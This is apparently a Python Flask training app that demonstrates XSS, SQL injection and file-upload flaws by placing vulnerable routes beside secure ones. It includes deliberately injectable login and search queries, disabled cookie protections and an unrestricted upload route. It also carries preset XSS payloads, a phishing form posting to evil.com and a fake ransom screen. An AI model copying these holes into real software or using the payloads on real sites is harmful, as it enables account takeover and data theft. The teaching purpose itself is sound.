import os
import time
import psycopg2
from functools import wraps
from flask import Flask, render_template, request, redirect, url_for, send_from_directory, flash, session, make_response, jsonify

app = Flask(__name__)
app.secret_key = 'super_secret_key'

# Відключаємо захист кукі
app.config['SESSION_COOKIE_HTTPONLY'] = False 
app.config['SESSION_COOKIE_SECURE'] = False

LAST_DB_RESET = time.time()

UPLOAD_FOLDER = 'uploads'
ALLOWED_EXTENSIONS = {'txt', 'pdf', 'png', 'jpg', 'jpeg', 'gif', 'doc', 'docx', 'mp4'}
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)

# --- БАЗА ВІРУСІВ ---
PRESET_FILES = {
    'test_alert.html': '<script>alert("XSS Successful!")</script><h1>HACKED</h1>',
    'cookie_stealer.html': '<script>alert("VICTIM COOKIES:\\n" + document.cookie);</script>',
    'calc.exe': 'FAKE BINARY CONTENT',
    'evil_image.svg': '''<svg width="300" height="300" xmlns="http://www.w3.org/2000/svg" onload="alert('XSS IN THE HOUSE!')">
        <rect width="300" height="300" style="fill:yellow;stroke:black;stroke-width:3" />
        <text x="50" y="150" font-family="Verdana" font-size="30" fill="black">SVG XSS</text>
    </svg>''',
    'fake_login.html': '<h2>Session Expired</h2><form action="http://evil.com"><input placeholder="Password" type="password"><button>Login</button></form>',
    
    # ВИПРАВЛЕНИЙ СКРИПТ ЗЛОМУ
    'simulation_hack.html': '''<!DOCTYPE html><html lang="uk"><head><meta charset="UTF-8"><style>body{margin:0;overflow:hidden;background:black;font-family:monospace;user-select:none}#bg{position:fixed;top:0;left:0;width:100%;height:100%;z-index:1}canvas{display:block}#log{position:absolute;bottom:0;left:0;padding:20px;color:#0f0;z-index:10;pointer-events:none}.box{display:none;position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);border:4px solid red;padding:40px;background:rgba(0,0,0,0.9);color:red;text-align:center;box-shadow:0 0 100px red;z-index:9999}.shake{animation:s 0.1s infinite}@keyframes s{0%{transform:translate(calc(-50% + 2px),calc(-50% + 2px))}100%{transform:translate(-50%,-50%)}}</style></head><body><div id="bg"><canvas id="m"></canvas><div id="log"></div></div><div id="box" class="box"><h1>SYSTEM COMPROMISED</h1><h2 id="txt"></h2></div><script>const ctx=document.getElementById('m').getContext('2d');let w=window.innerWidth,h=window.innerHeight;document.getElementById('m').width=w;document.getElementById('m').height=h;const cols=Math.floor(w/14);const y=Array(cols).fill(0);function mat(){ctx.fillStyle='#0001';ctx.fillRect(0,0,w,h);ctx.fillStyle='#0f0';ctx.font='14px monospace';y.forEach((v,i)=>{ctx.fillText(String.fromCharCode(0x30A0+Math.random()*96),i*14,v);y[i]=v>h+Math.random()*10000?0:v+14});}setInterval(mat,35);const cmds=['Root access...','Bypassing FW...','Stealing data...','DONE'];let i=0;function l(){if(i<cmds.length){document.getElementById('log').innerHTML+='> '+cmds[i]+'<br>';i++;setTimeout(l,800)}else{document.getElementById('box').style.display='block';document.getElementById('box').classList.add('shake');document.getElementById('txt').innerText="SEND BITCOIN";}}setTimeout(l,1000);</script></body></html>'''
}

# --- DB CONFIG ---
DB_CONFIG = {
    'dbname': os.environ.get('POSTGRES_DB', 'xss_demo_db'),
    'user': os.environ.get('POSTGRES_USER', 'postgres'),
    'password': os.environ.get('POSTGRES_PASSWORD', 'your_password'), # <--- ВАШ ПАРОЛЬ
    'host': os.environ.get('DB_HOST', 'localhost')
}

def get_db_connection():
    conn = psycopg2.connect(**DB_CONFIG)
    return conn

def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'user_id' not in session:
            if request.headers.get('X-Requested-With') == 'XMLHttpRequest':
                return jsonify({'status': 'error', 'message': 'Login required'}), 401
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated_function

@app.route('/check_db_version')
def check_db_version():
    return jsonify({'version': LAST_DB_RESET})

@app.route('/login', methods=['GET', 'POST'])
def login():
    if 'user_id' in session: return redirect(url_for('dashboard'))
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        conn = get_db_connection(); cur = conn.cursor()
        query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
        try:
            cur.execute(query)
            user = cur.fetchone()
            if user:
                session['user_id'] = user[0]; session['username'] = user[1]; session['role'] = user[3]
                resp = make_response(redirect(url_for('dashboard')))
                resp.set_cookie('secret_bank_account', '1000000_USD', httponly=False)
                return resp
            else: flash('Invalid credentials', 'danger')
        except Exception as e: flash(f'SQL Error: {e}', 'danger')
        cur.close(); conn.close()
    return render_template('login.html')

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))

# --- PAGES ---
@app.route('/dashboard')
@login_required
def dashboard():
    return render_template('dashboard.html')

@app.route('/')
@login_required
def index():
    if request.method == 'POST':
        content = request.form['content']
        conn = get_db_connection(); cur = conn.cursor()
        cur.execute('INSERT INTO comments (content) VALUES (%s)', (content,))
        conn.commit(); cur.close(); conn.close()
        return jsonify({'status': 'success', 'message': 'Payload Saved!'})
    return render_template('xss.html', preset_files=PRESET_FILES.keys())

@app.route('/sqli', methods=['GET', 'POST'])
@login_required
def sqli():
    vuln_result, vuln_error, vuln_query = None, None, ""
    sec_result, sec_query = None, ""
    search_term = ""
    
    if request.method == 'POST':
        search_term = request.form.get('search', '')
        if search_term:
            conn = get_db_connection()
            # 1. Vuln
            try:
                cur = conn.cursor()
                vuln_query = f"SELECT id, username, role FROM users WHERE username LIKE '%{search_term}%'"
                cur.execute(vuln_query)
                vuln_result = cur.fetchall()
                cur.close()
            except Exception as e:
                vuln_error = str(e)
                conn.rollback()
            # 2. Secure
            try:
                cur = conn.cursor()
                sec_query = "SELECT id, username, role FROM users WHERE username LIKE %s"
                cur.execute(sec_query, (f'%{search_term}%',))
                sec_result = cur.fetchall()
                cur.close()
            except: pass
            conn.close()
    return render_template('sqli.html', search_term=search_term, 
                           vuln_result=vuln_result, vuln_error=vuln_error, vuln_query=vuln_query,
                           sec_result=sec_result, sec_query=sec_query)

@app.route('/stealth')
@login_required
def stealth():
    return render_template('stealth.html')

# --- API ---
VIRUS_SIGNATURES = [b'script', b'alert', b'prompt', b'onerror', b'onload', b'eval', b'javascript']

@app.route('/scan_file', methods=['POST'])
@login_required
def scan_file():
    file = request.files.get('file')
    if not file: return jsonify({'status':'error', 'message':'No file'})
    content = file.read().lower()
    detected = [s.decode() for s in VIRUS_SIGNATURES if s in content]
    if detected: return jsonify({'status':'blocked', 'message':f'⛔ BLOCKED: {", ".join(detected)}'})
    
    file.seek(0)
    file.save(os.path.join(app.config['UPLOAD_FOLDER'], "stealth_"+file.filename))
    save_file_to_db("stealth_"+file.filename, 'secure')
    return jsonify({'status':'clean', 'message':'✅ CLEAN'})

@app.route('/upload_vulnerable', methods=['POST'])
@login_required
def upload_vulnerable():
    file = request.files.get('file')
    if not file: return jsonify({'status':'error', 'message':'No file'})
    file.save(os.path.join(app.config['UPLOAD_FOLDER'], file.filename))
    save_file_to_db(file.filename, 'vulnerable')
    return jsonify({'status':'warning', 'message':f'{file.filename} Uploaded'})

@app.route('/upload_secure', methods=['POST'])
@login_required
def upload_secure():
    file = request.files.get('file')
    if not file: return jsonify({'status':'error', 'message':'No file'})
    if allowed_file(file.filename):
        file.save(os.path.join(app.config['UPLOAD_FOLDER'], file.filename))
        save_file_to_db(file.filename, 'secure')
        return jsonify({'status':'success', 'message':f'{file.filename} Uploaded'})
    return jsonify({'status':'error', 'message':'Blocked'})

@app.route('/upload_preset', methods=['POST'])
@login_required
def upload_preset():
    fname = request.form.get('filename')
    mode = request.form.get('mode')
    if fname not in PRESET_FILES: return jsonify({'status':'error'})
    if mode == 'secure' and not allowed_file(fname): return jsonify({'status':'error', 'message':'Blocked'})
    
    # ВИПРАВЛЕНО: encoding='utf-8'
    with open(os.path.join(app.config['UPLOAD_FOLDER'], fname), 'w', encoding='utf-8') as f: 
        f.write(PRESET_FILES[fname])
    save_file_to_db(fname, mode)
    return jsonify({'status':'success', 'message':f'{fname} Injected'})

@app.route('/inject_all', methods=['POST'])
@login_required
def inject_all():
    for f, c in PRESET_FILES.items():
        # ВИПРАВЛЕНО: encoding='utf-8'
        with open(os.path.join(app.config['UPLOAD_FOLDER'], f), 'w', encoding='utf-8') as file: 
            file.write(c)
        save_file_to_db(f, 'vulnerable')
    return jsonify({'status':'warning', 'message':'ALL VIRUSES INJECTED'})

@app.route('/reset_db', methods=['POST'])
@login_required
def reset_db():
    global LAST_DB_RESET
    conn = get_db_connection(); cur = conn.cursor()
    cur.execute('TRUNCATE comments RESTART IDENTITY;')
    cur.execute('TRUNCATE files RESTART IDENTITY;')
    conn.commit(); cur.close(); conn.close()
    for f in os.listdir(UPLOAD_FOLDER): os.remove(os.path.join(UPLOAD_FOLDER, f))
    LAST_DB_RESET = time.time()
    return jsonify({'status':'info', 'message':'DB Cleared'})

def save_file_to_db(name, type):
    conn = get_db_connection(); cur = conn.cursor()
    cur.execute('INSERT INTO files (filename, upload_type) VALUES (%s, %s)', (name, type))
    conn.commit(); cur.close(); conn.close()

@app.route('/vulnerable')
def win_vuln():
    conn = get_db_connection(); cur = conn.cursor()
    cur.execute('SELECT content FROM comments ORDER BY id DESC'); comms = cur.fetchall()
    cur.execute('SELECT filename, upload_type FROM files ORDER BY id DESC'); files = cur.fetchall()
    cur.close(); conn.close()
    return render_template('vulnerable.html', comments=comms, files=files)

@app.route('/secure')
def win_sec():
    conn = get_db_connection(); cur = conn.cursor()
    cur.execute('SELECT content FROM comments ORDER BY id DESC'); comms = cur.fetchall()
    cur.execute("SELECT filename, upload_type FROM files WHERE upload_type='secure' ORDER BY id DESC"); files = cur.fetchall()
    cur.close(); conn.close()
    return render_template('secure.html', comments=comms, files=files)

if __name__ == '__main__':
    app.run(debug=True)